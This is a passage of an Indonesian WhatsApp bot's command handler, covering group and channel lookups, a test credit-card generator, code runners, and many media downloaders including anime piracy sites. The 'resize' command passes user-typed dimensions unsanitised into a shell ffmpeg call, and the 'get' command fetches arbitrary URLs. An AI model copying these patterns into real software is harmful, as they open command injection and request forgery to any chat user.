await XReaction()
				if (!text) return reply(`${XyrooRynzz} Url Group`)
				if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply('tidak terdeteksi')
				try {
					let result = args[0].split('https://chat.whatsapp.com/')[1]
					let inpo = await Alice.groupGetInviteInfo(result)
					let teks = `
* ID: ${inpo.id}
* name: ${inpo.subject}
* owner: ${inpo.owner}
* kirim Pesan: ${inpo.announce ? 'Hanya Admin' : "Semua Orang"}
* persetujuan admin: ${inpo.joinApprovalMode ? 'Yes' : "No"}
* member Add mode: ${inpo.memberAddMode ? 'Yes' : "No"}
* deskripsi: ${inpo.desc}`				
					let button = [
                        {
                            name: "cta_copy",
					        buttonParamsJson: JSON.stringify({
                                display_text: "ID Group",
                                id: `${inpo.id}`,
                                copy_code: `${inpo.id}`
                            })
					    }
                    ]
					Alice.sendInteractive(m.chat, button, null, packname, teks, m)
				} catch (error) {
					XRR()
				}
			}
			break
			case 'inspect':
            case 'cekidch':
			case 'getch':
			case 'getinfoch':
			case 'getchid': {
if (isBan) return XRB()
await XReaction()
				if (!text) return reply(`${XyrooRynzz} Url Channel WhatsApp`)
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return reply('tidak valid')

				function formatDate(timestamp) {
					const date = new Date(timestamp * 1000);
					const months = [
						'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
						'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
					];
					const day = date.getDate();
					const month = months[date.getMonth()];
					const year = date.getFullYear();
					return `${day} ${month} ${year}`;
				}
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1]
					let data = await Alice.newsletterMetadata("invite", result)
					let teks = `
* name: ${data.name}
* ID: ${data.id}
* status: ${data.state}
* dibuat Pada: ${formatDate(data.creation_time)}
* subscribers: ${data.subscribers}
* meta Verify: ${data.verification}
* react emoji: ${data.reaction_codes}
* description: ${data.description}`
					let button = [
                        {
                            name: "cta_copy",
					        buttonParamsJson: JSON.stringify({
                                display_text: "ID Channelnya",
                                id: `${data.id}`,
                                copy_code: `${data.id}`
                            })
					    }
                    ]
					Alice.sendInteractive(m.chat, button, null, packname, teks, xy)
				} catch (error) {
					XRR()
				}
			}
			break
		
case 'stext':
case 'sharetext':
case 'sharetxt' : {
    if (!text) reply('Kasih teks yang mau dishare dong...')

const bikinLink = async (teks) => {
    const {
        data
    } = await axios.post('https://sharetext.io/api/text', {
        text: teks
    }, {
        headers: {
            'User-Agent': 'Mozilla/5.0',
            'Referer': 'https://sharetext.io/'
        }
    });

    if (!data) throw 'Gagal bikin link';
    return `https://sharetext.io/${data}`;
};


    try {
        const link = await bikinLink(text);
        await reply(`Nih link teks lu: ${link}`);
    } catch (e) {
        await reply(`Waduh error: ${e}`);
    }
};
break

case 'ccgen': {
  let [type, jumlah] = args;
  if (!type || !jumlah) return reply(
    `Contoh:\n${Xyroo}ccgen Visa 5\n\nTipe:\n- Visa\n- MasterCard\n- American Express\n- JCB\n\nJumlah: 5 - 20`
  );

  let allowed = ['Visa', 'MasterCard', 'American Express', 'JCB'];
  if (!allowed.includes(type)) return reply(`Tipe tidak valid:\n${allowed.join('\n')}`);

  let num = parseInt(jumlah);
  if (isNaN(num)) return reply('Jumlah harus angka');
  if (num < 5 || num > 20) return reply('Jumlah kartu harus 5-20');

  try {
    let { data } = await axios.get(`https://backend.lambdatest.com/api/dev-tools/credit-card-generator?type=${encodeURIComponent(type)}&no-of-cards=${num}`);
    if (!Array.isArray(data) || !data.length) return reply('Gagal dapat data');

    let teks = `*Generated ${type} Credit Cards (${num}) :*\n\n` + data.map((v, i) =>
      `*${i + 1}.* ${v.name}\n• Number : ${v.number}\n• CVV : ${v.cvv}\n• Expired : ${v.expiry}\n`
    ).join('\n');

    reply(teks.trim());
  } catch (e) {
    console.error(e);
    reply('Error, coba lagi nanti');
  }
}
break
case 'py':
case 'python': {
  if (!q) return reply(`Masukkan input`);
  if (q.length > 600) return reply(`Maksimal 600 Karakter`);

  try {
    const result = await Python(q);
    if (!result) {
      return reply("invalid server");
    }
    await reply(`${packname}\n\n${result}`);
  } catch (error) {
    console.error("Error :", error.message);
    reply("invalid server");
  }
}
break

case 'js':
case 'javascript': {
  if (!q) return reply(`Masukkan input`);
  if (q.length > 600) return reply(`Maksimal 600 Karakter`);

  try {
    const result = await JavaScript(q);
    if (!result) {
      return reply("invalid server");
    }
    await reply(`${packname}\n\n${result}`);
  } catch (error) {
    console.error("Error :", error.message);
    reply("invalid server");
  }
}
break

case 'html': {
  if (!q) return reply(`Masukkan input`);

  try {
    const result = await Html(q);
    if (!result) {
      return reply("invalid server");
    }
    await reply(`${result}`);
  } catch (error) {
    console.error("Error :", error.message);
    reply("invalid server");
  }
}
break

case 'topcmd': {
if (isBan) return XRB()
await XReaction()  
  let data = Object.entries(global.topcmd)
      .sort((a, b) => b[1] - a[1]) // Urutkan Dari Yang Paling Banyak Dipakai
      .slice(0, 10) // Ambil 10 Teratas
      .map(([cmd, count], index) => `${index + 1}. *${cmd} - ${count}x*`)
      .join('\n');

  if (!data) data = "Tidak Ada Data";

  let teks = `Fitur Paling Sering Digunakan\n\n${data}`;
  Alice.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break

case 'resize': {
if (isBan) return XRB()
await XReaction()
  if (!args[0]) return reply(`Contoh ${XyrooRynzz} 300x300\nPanjangxlebar`)
  
  let panjang = q.split('x')[0]
  let lebar = q.split('x')[1]
  
  let media = await Alice.downloadAndSaveMediaMessage(quoted);
  let ran = getRandom('.jpeg')

  const command = `ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`
  
  exec(command, async (err) => {
    fs.unlinkSync(media)

    try {
      let buffer453 = fs.readFileSync(ran)
      await Alice.sendMessage(
        m.chat, 
        {
          mimetype: 'image/jpeg',
          image: buffer453
        }, 
        { quoted: m }
      );
    } catch (readError) {
      return reply('Terjadi kesalahan: '+readError)
    } finally {
      fs.unlinkSync(ran)
    }
  })
}
break

case 'diffusion':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply('Apa yang ingin kamu buat?')
await Alice.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}}) 
    try {
 Alice.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break

case 'delete': case 'del': case 'd':{
if (isBan) return XRB()
await XReaction()
if (!isAdmins) return XRA()
            	 let key = {}
             try {
               	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
            	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
            	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
             	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
         } catch (e) {
 	console.error(e)
 }
 Alice.sendMessage(m.chat, { delete: key })
}
break

case 'get': {
if (isBan) return XRB()
await XReaction()
  if (!/^https?:\/\//.test(text))
  return reply("Awali *URL* dengan http:// atau https://");
  const ajg = await fetch(text);
  if (ajg.headers.get("content-length") > 100 * 1024 * 1024 * 1024) {
    throw `Content-Length: ${ajg.headers.get("content-length")}`;
  }
  const contentType = ajg.headers.get("content-type");
  if (contentType.startsWith("image/")) {
    return Alice.sendMessage(m.chat, { image: { url: text } });
  }
  if (contentType.startsWith("video/")) {
    return Alice.sendMessage(m.chat, { video: { url: text } });
  }
  if (contentType.startsWith("audio/")) {
    return Alice.sendMessage(m.chat, { audio: { url: text }, mimetype: "audio/mpeg"  });
  }
  let alak = await ajg.buffer();
  try {
    alak = util.format(JSON.parse(alak + ""));
  } catch (e) {
    alak = alak + "";
  } finally {
    reply(alak.slice(0, 65536));
  }
}
break
case "kalkulator":{
if (isBan) return XRB()
await XReaction()
if (text.split("+")[0] && text.split("+")[1]) {
const nilai_one = Number(text.split("+")[0])
const nilai_two = Number(text.split("+")[1])
reply(`${nilai_one + nilai_two}`)
} else if (text.split("-")[0] && text.split("-")[1]) {
const nilai_one = Number(text.split("-")[0])
const nilai_two = Number(text.split("-")[1])
reply(`${nilai_one - nilai_two}`)
} else if (text.split("×")[0] && text.split("×")[1]) {
const nilai_one = Number(text.split("×")[0])
const nilai_two = Number(text.split("×")[1])
reply(`${nilai_one * nilai_two}`)
} else if (text.split("÷")[0] && text.split("÷")[1]) {
const nilai_one = Number(text.split("÷")[0])
const nilai_two = Number(text.split("÷")[1])
reply(`${nilai_one / nilai_two}`)
} else reply(`*Example* : ${XyrooRynzz} 1 + 1`)
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Tools Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Downloader Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'soundcloud-download': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Ex? ${XyrooRynzz} https://soundcloud.com/xxxxxxx/xxxx/xxx`);
 
  try {
 
    const res = await fetch(`https://zenz.biz.id/downloader/SoundCloud?url=${encodeURIComponent(text)}`);
    const json = await res.json();
 
    if (!json.status || !json.audio_url) {
      return reply('pastiin url SoundCloud lu bener ya dek');
    }
 
    const caption = `
🎵 *Judul:* ${json.title}
👤 *Author:* ${json.author}
🕒 *Durasi:* ${json.duration}
🔗 *Source:* ${json.source_url}
`.trim();
 
    await Alice.sendMessage(m.chat, {
      audio: { url: json.audio_url },
      mimetype: 'audio/mpeg',
      ptt: false,
      fileName: `${json.title}.mp3`,
      contextInfo: {
        externalAdreply: {
          title: json.title,
          body: `Author: ${json.author}`,
          thumbnailUrl: json.thumbnail,
          mediaType: 2,
          mediaUrl: json.source_url,
          sourceUrl: json.source_url,
          renderLargerThumbnail: true,
        },
      },
    }, { quoted: m });
 
    await reply(caption);
 
  } catch (err) {
    console.error(err);
    reply('eror nih bre.');
  }
};
break
case "spotify-download": case "spdown":
case "spotifydown": 
case "downspotify": {
    if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Example: ${XyrooRynzz} url spotify`);
  
  try {
    console.log(`🔍 Fetching data from: ${text}`);
const axios = require('axios');
    const response = await axios.post('https://spotymate.com/api/download-track',
      { url: text },
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
          'Referer': 'https://spotymate.com/'
        }
      }
    );

    if (response.data && response.data.file_url) {
      let caption = `*SPOTIFY DOWNLOADER* ◦\n\n`;
      caption += `*Status* : Berhasil ✅\n`;
      caption += `*URL* : ${text}\n`;
      
      await Alice.sendMessage(m.chat, { text: caption });
      await Alice.sendMessage(m.chat, { 
        audio: { url: response.data.file_url }, 
        mimetype: 'audio/mpeg',
        fileName: 'spotify_download.mp3'
      });
    } else {
      reply('❌ Tidak dapat menemukan link unduhan!');
    }
  } catch (error) {
    console.log(error);
    reply(`❌ Error: ${error.message}`);
  }
}
break
case 'duoyin':
  case 'duoyindl': {
 if (isBan) return XRB()
await XReaction()
  const url = args[0]
  if (!url) return reply(`Contoh: ${XyrooRynzz} https://v.douyin.com/iPHW24DE/`)

const douyin = async (url) => {
  const apiUrl = "https://lovetik.app/api/ajaxSearch"
  const formBody = new URLSearchParams()
  formBody.append("q", url)
  formBody.append("lang", "id")

  const res = await fetch(apiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "Accept": "*/*",
      "X-Requested-With": "XMLHttpRequest"
    },
    body: formBody.toString()
  })

  const data = await res.json()
  if (data.status !== "ok") throw "Gagal mengambil data Douyin."

  const $ = cheerio.load(data.data)
  const title = $("h3").text()
  const thumbnail = $(".image-tik img").attr("src")
  const duration = $(".content p").text()
  const dl = []

  $(".dl-action a").each((i, el) => {
    dl.push({
      text: $(el).text().trim(),
      url: $(el).attr("href")
    })
  })

  return { title, thumbnail, duration, dl }
}

  try {
    const result = await douyin(url)
    const caption = `*Judul:* ${result.title}\n*Durasi:* ${result.duration}`

    const video = result.dl.find(v => /mp4/i.test(v.text))
    const audio = result.dl.find(v => /mp3/i.test(v.text))

    if (video) {
      await Alice.sendMessage(m.chat, {
        video: { url: video.url },
        caption
      }, { quoted: m })
    }

    if (audio) {
      await Alice.sendMessage(m.chat, {
        audio: { url: audio.url },
        mimetype: 'audio/mp4'
      }, { quoted: m })
    }

    if (!video && !audio) {
      reply('Tidak ditemukan link video atau audio.')
    }
  } catch (e) {
    console.error(e)
    reply('Gagal mengunduh video Douyin. Pastikan link valid.')
  }
}
break
case 'twitter': case 'twitterdl': case 'x': case 'xdl': {
if (isBan) return XRB()
await XReaction()
if (!text.includes('x.com')) return reply(`• *Example :* ${XyrooRynzz} https://x.com/xxxx`)
await XReaction()
try {
async function twitterDl(link) {
  try {
    const token = await axios.post('https://x2twitter.com/api/userverify', 'url=' + link)
    const data = qs.stringify({
      q: link,
      lang: 'en',
      cftoken: token.data.token
    })

    const html = await axios.post('https://x2twitter.com/api/ajaxSearch', data, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })

    const $ = cheerio.load(html.data.data)
    let result = {}

    if ($('.tw-video').length > 0) {
      result.type = 'video'
      result.title = $('.clearfix h3').text().trim()
      result.duration = $('.clearfix p').text().trim()
      result.thumbnail = $('.image-tw img').attr('src')
      result.download = []

      $('.dl-action a').each((_, el) => {
        const quality = $(el).text().trim()
        if (quality.includes('Download MP4')) {
          result.download.push({
            link: $(el).attr('href'),
            quality
          })
        }
      })
    } else if ($('.video-data').length > 0 || $('.download-items__thumb img').length > 0) {
      result.type = 'photo'
      result.thumb = $('.download-items__thumb img').attr('src')
      result.download = $('.download-items__btn a').attr('href')
    }

    return result
  } catch (err) {
    throw 'Gagal mengunduh media dari Twitter/X. Coba lagi nanti.'
  }
}

    const res = await twitterDl(text)

    if (res.type === 'video' && res.download.length > 0) {
      const videoRes = await axios.get(res.download[0].link, {
        responseType: 'arraybuffer'
      })

      await Alice.sendMessage(m.chat, {
        video: videoRes.data,
        caption: `*Judul:* ${res.title || 'Tidak diketahui'}\n*Durasi:* ${res.duration || '-'}`
      }, { quoted: m })
    } else if (res.type === 'photo' && res.download) {
      const imgRes = await axios.get(res.download, { responseType: 'arraybuffer' })

      await Alice.sendMessage(m.chat, {
        image: imgRes.data,
        caption: 'Foto dari X/Twitter'
      }, { quoted: m })
    } else {
      reply('Media tidak ditemukan atau tidak didukung.')
    }
  } catch (err) {
    reply(typeof err === 'string' ? err : 'Terjadi kesalahan saat mengambil media.')
  }
}
break
case 'resepdownload': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Please provide a Cookpad recipe URL!\n\nExample: ${XyrooRynzz} https://cookpad.com/id/resep/1234567`);

async function getRecipeDetails(url) {
  let { data } = await axios.get(url);
  let $ = cheerio.load(data);

  let cookingTime = $(".recipe-show__meta-container .icon_with_text .recipe-show__time").text().trim();
  let ingredients = [];
  let steps = [];

  $(".ingredient").each((i, el) => {
    ingredients.push($(el).text().trim());
  });

  $(".step").each((i, el) => {
    steps.push($(el).text().trim());
  });

  return { cookingTime, ingredients, steps };
}

    const detail = await getRecipeDetails(text);

    if (!detail) {
      return reply('No details found for the given URL.');
    }

    let message = `
🍽️ *Recipe Details!* 🍽️
- ⏲️ Cooking Time: ${detail.cookingTime}
- 📝 Ingredients: ${detail.ingredients.join(', ')}
- 📖 Steps: ${detail.steps.join('\n')}
- 🔗 [View Recipe](${text})
    `;

    await Alice.sendMessage(m.chat, { text: message, footer: packname }, { quoted: m });
  } catch (error) {
    console.error(error);
    return reply("An error occurred: " + error.message);
  }
};
break

    case "nontonanime-detail": {
if (isBan) return XRB()
await XReaction()
        if (!args[0]) return reply("Masukkan URL anime!");
        const detail = await nontonAnime.details(args[0]);
        if (!detail) return reply("Gagal mengambil detail anime.");
        await Alice.sendMessage(m.chat, {
          image: { url: detail.thumbnail },
          caption: `*${detail.title}*\n\n${detail.synopsis}\n\nStatus: ${detail.status}\nStudio: ${detail.studio}\nSeason: ${detail.season}\nTipe: ${detail.type}`
        }, { quoted: m });
      }
      break;
      
    case "nontonanime-download": {
if (isBan) return XRB()
await XReaction()
        if (!args[0]) return reply("Masukkan link episode!");
        const links = await nontonAnime.download(args[0]);
        if (!links.length) return reply("Link download tidak ditemukan.");
        await Alice.sendMessage(m.chat, {
          text: `*Link Download:*\n\n${links.join("\n\n")}`,
        }, { quoted: m });
      }
      break;
            
      case "shortlink-dl": {
if (isBan) return XRB()
await XReaction()    
          if (!text) return reply(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          if (!isUrl(text)) return reply(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          var a = await fetch(
            `https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`
          );
          await Alice.sendMessage(m.chat, { text: a.url }, { quoted: m });
        }
        break;

case 'fb':
case 'fbdl':
case 'facebook' : {
if (isBan) return XRB()
await XReaction()
if (!text) return reply('url facebook?')
    try {
      let res = await fdown.download(text);
      if (res && res.length > 0) {
        let videoData = res[0]; 
        let videoUrl = videoData.hdQualityLink || videoData.normalQualityLink; 
        if (videoUrl) {
          let caption = `*Title:* ${videoData.title}\n*Description:* ${videoData.description}\n*Duration:* ${videoData.duration}`;
          await Alice.sendMessage(m.chat, { 
            video: { url: videoUrl }, 
            caption: caption, 
            mimetype: 'video/mp4'
          }, { quoted: m });
        }
      } else {
        return reply(mess.error)
      }
    } catch (e) {
      console.log(e);
      XRR()
    }
  }
break
case 'samehadakudl': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('Link?..');
    
    // Mengambil data dari API
    let cari = await (await fetch(`https://api.siputzx.my.id/api/anime/samehadaku/download?url=${text}`)).json();
    
    // Memeriksa status respon
    if (cari.status) {
        let title = cari.data.title;
        let cap = `*_PILIH LINK ALTERNATIF untuk ${title}*_` + '\n\n';
        
        // Mengiterasi unduhan
        for (let ciroo of cari.data.downloads) {
            cap += `*🏷️ ALTERNATIF ${ciroo.nume} :* ${ciroo.name}\n*🔗 LINK UNDUH :* ${ciroo.link || 'Tidak tersedia'}\n\n`;
        }
        
        await reply(cap);
    } else {
        await reply('Data tidak ditemukan.');
    }
}
break;

case 'apkdl': 
case 'apkdownload': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('link dari apksearch');
    
    try {
        let response = await fetch(`https://api-yudzxml.vercel.app/api/apk?action=download&url=` + text);
        let apk = await response.json();

        if (apk.status === 200 && apk.data.status === 200) {
            let app = apk.data.data;
            Alice.sendMessage(m.chat, {
                document: {
                    url: app.url
                },
                fileName: app.package + '.apk',
                mimetype: 'application/xapk',
                contextInfo: {
                    externalAdreply: {
                        title: app.title,
                        body: `${botname}`,
                        thumbnailUrl: app.img || '',
                        mediaType: 1,
                        showAdAttribution: true,
                        renderLargerThumbnail: false,
                    },
                },
            }, { quoted: m });
        } else {
            reply('ada masalah');
        }
    } catch (e) {
        reply('ada masalah');
    }
}
break;
case 'git':
case 'gitclone': {
  try {
    if (!args[0]) return reply(`Contoh: ${XyrooRynzz} linknya`)
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Harus berupa link github!`)
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    var [, userr, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    var url = `https://api.github.com/repos/${userr}/${repo}/zipball`
    let filename = (await fetch(url, {
      method: 'HEAD'
    })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Alice.sendMessage(m.chat, {
      document: {
        url: url
      },
      fileName: filename + '.zip',
      mimetype: 'application/zip'
    }, {
      quoted: m
    })
  } catch (err) {
    reply('Terjadi kesalahan')
  }
}
break
case 'telestick':
  case 'stickertele':
     case 'stele':{
if (isBan) return XRB()
await XReaction()
         if (args.length == 0) return reply(`mana url nya? contoh : ${XyrooRynzz} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon`); 
         if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {              
         await XReaction()
             let res = await Telesticker(args[0]);              
             if (m.isGroup && res.length > 30) {
                 await reply("sticker terdapat 30+ maka akan dikirim melalui private chat");
                 
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await Alice.sendImageAsSticker(m.sender, res[i].url, m, { 
                           packname: global.packname, 
                           author: global.author });        
                       await fs.unlinkSync(encmedia);
                       await sleep(9000);
                   }
             } else {
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await Alice.sendImageAsSticker(m.chat, res[i].url, m, {
                           packname: global.packname, 
                           author: global.author });
                       await fs.unlinkSync(encmedia)
                       await sleep(9000);           
                   }
               }
           }
       }
       break;

case 'pindl': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Link untuk di download`);

  try {
      const result = await PinDL(text);

      if (result.error) {
          return reply(`❌ *Error:* ${result.error}`);
      }

      let caption = `*Pinterest Downloader*\n${packname}`;

      if (result.type === "video") {
          console.log("🔗 Mengunduh video:", result.url);
          const response = await axios.get(result.url, { responseType: 'arraybuffer' });
          const videoBuffer = Buffer.from(response.data, 'binary');

          await Alice.sendMessage(m.chat, { video: videoBuffer, mimetype: 'video/mp4', caption }, { quoted: m });

      } else {
          await Alice.sendMessage(m.chat, { image: { url: result.url }, caption }, { quoted: m });
      }

  } catch (err) {
      console.error("Error saat mengambil media Pinterest:", err);
      reply("*Terjadi kesalahan saat mengambil media dari Pinterest!*\nCoba lagi nanti.");
  }
}
break

case 'cocofun':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Example: ${XyrooRynzz} https://www.icocofun.com/share/post/565326210234?lang=id&pkg=id&share_to=copy_link&m=06fa9a57a737be2bee99bea6bcdb20ee&d=7a1c5048f54ef09b7c0fa0f3c463692949f35fa30d93fc1130f6e8153f537b51&nt=1`)
await XReaction()
let old = new Date()
let asy = await chApi.cocofun(text)
let caption = `乂  *C O C O F U N*\n\n`
caption += `	◦  *Topic* : ${asy.topic}\n`
caption += `	◦  *Caption* : ${asy.caption}\n`
caption += `	◦  *Play* : ${asy.play}\n`
caption += `	◦  *Like* : ${asy.like}\n`
caption += `	◦  *Share* : ${asy.share}\n`
caption += `	◦  *Duration* : ${asy.duration}\n\n`
caption += `	◦  *Fetching* : ${((new Date - old) * 1)} ms\n\n` 
Alice.sendMessage(m.chat, { video: { url: asy.no_watermark }, caption: caption }, { quoted: m })
uselimit()
reply(`\`Usage 1 Limit , You Have ${limitnya} More\``)
}
break

case 'sf': case 'sfile': case 'sfiledl': case 'sfdl': {
if (isBan) return XRB()
await XReaction()
if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* ${XyrooRynzz} https://sfile.mobi/xxxxxxx/`)

await XReaction()
const sfile = {
    latest_uploads: async function(page = 1) {
        try {
            const res = await axios.get('https://sfile.mobi');
            const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'cookie': cookies,
                'referer': 'https://sfile.mobi/uploads.php',
                'user-agent': 'Postify/1.0.0'
            };
            const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
            const $ = cheerio.load(uploads.data);

            const data = $('.list').map((_, el) => ({
                title: $(el).find('a').text().trim(),
                link: $(el).find('a').attr('href'),
                size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
                uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
            })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

            return { creator: `${ownername}`, status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
        }
    },

    top_trending: async function(page = 1) {
        try {
            const response = await axios.get('https://sfile.mobi');
            const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'authority': 'sfile.mobi',
                'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
                'cookie': cookies,
                'referer': `https://sfile.mobi/top.php?page=${page}`,
                'user-agent': 'Postify/1.0.0'
            };
            const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
            const $ = cheerio.load(top.data);

            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
                const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

                return title && link && size && downloadCount && uploadedDate ? 
                    { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
            }).get().filter(item => item);

            return { creator: `${ownername}`, status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
        }
    },
    
    search: async function(query, page = 1) {
        try {
            const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
            const response = await axios.get(url, {
                headers: {
                    'authority': 'sfile.mobi',
                    'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
                    'referer': url,
                    'user-agent': 'Postify/1.0.0'
                }
            });

            const $ = cheerio.load(response.data);
            
            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
                const size = sizeMatch ? sizeMatch[1] : undefined;
                return title ? { title, link, size } : null;
            }).get();

            return { creator: `${ownername}`, status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
        }
    },
    
    download: async function(url) {
        const headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-Agent': 'Postify/1.0.0',
        };

        try {
            const response = await axios.get(url, { headers });
            headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

            const [filename, mimetype, downloadLink] = [
                response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
            ];
            
            if (!downloadLink) return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

            headers.Referer = downloadLink;
            const final = await axios.get(downloadLink, { headers });

            const [directLink, key, filesize] = [
                final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                final.data.match(/Download File \((.*?)\)/)?.[1]
            ];

            const result = directLink + (key ? `&k=${key}` : '');
            if (!result) return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

            const data = await this.convert(result, url);

            return { creator: `${ownername}`, status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
        } catch (error) {
            return { creator: `${ownername}`, status: 'error', code: 500, data: [], message: error.message };
        }
    },

    convert: async function(url, directLink) {
        try {
            const init = await axios.get(url, {
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 303,
                headers: {
                    'Referer': directLink,
                    'User-Agent': 'Postify/1.0.0'
                },
            });

            const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            const redirect = init.headers.location;

            const final_result = await axios.get(redirect, {
                responseType: 'arraybuffer',
                headers: {
                    'referer': directLink,
                    'user-agent': 'Postify/1.0.0',
                    'cookie': cookies,
                },
            });

            const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
            return {
                filename,
                mimeType: final_result.headers['content-type'],
                buffer: Buffer.from(final_result.data)
            };
        } catch (error) {
            throw error;
        }
    }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ - s ғ ]* ──⪼┓`
sfcap += `〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `〆 ᴜʀʟ : ${text}\n`
sfcap += `┗⪻─────────────────────────⪼┛`

await Alice.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted: m});
} catch (err) {
}}
break

case 'mfdl':
case 'mediafire': {
if (isBan) return XRB()
await XReaction()
 if (!text) return reply('sertakan link mediafire')
  try {
    const api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${encodeURIComponent(text)}`)
    if (!api.status || !api.result || !api.result[0]) return reply('Gagal mengambil data dari API.')

    const data = api.result[0]
    const fileNama = decodeURIComponent(data.nama || 'file.zip')
    const extension = fileNama.split('.').pop().toLowerCase()

    const res = await axios.get(data.link, { responseType: 'arraybuffer' })
    const media = Buffer.from(res.data)

    let mimetype = ''
    if (extension === 'mp4') mimetype = 'video/mp4'
